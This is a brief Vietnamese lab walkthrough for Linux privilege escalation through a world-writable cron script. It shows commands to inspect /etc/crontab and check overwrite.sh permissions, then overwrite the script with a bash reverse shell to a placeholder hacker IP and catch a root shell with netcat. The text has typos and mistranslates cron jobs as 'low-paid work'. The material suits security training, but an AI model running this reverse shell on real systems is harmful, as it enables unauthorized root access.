# File Perms
- Cron Jobs (Công việc lương thấp) là những prog hay scripts mà usr có thể lên lịch để chạy ở thời điểm nhất định. Cron Table files (crontabs) chuyền config tới cron jobs. Crontabs toàn hệ thống được đặt ở ```/etc/crontab```

- Xem nội dung của crontab này:

      cat /etc/crontab
- Nên có 2 cron jobs được lên lịch để chạy mỗi phút. Một chạy ```overưrite.sh```, còn lại chạy ```/usr/local/bin/compress.sh```
- Locate địa chỉ của overwrite.sh:

      locate overwrite.sh
- Kiểm tra xem nó có thể dudợc chỉnh sửa bởi tất cả không:

      ls -l /usr/local/bin/overwrite.sh
- Thay nội dung của của overwrite.sh thành như dưới đấy

      #!/bin/bash
      bash -i >& /dev/tcp/<hacker_ip>/<hacker_port> 0>&1
- Setup một netcat listener trên máy hacker trùng với ```<hacker_port``` và đợi nó hoạt động. Root shell sẽ xuất hiện sau đó
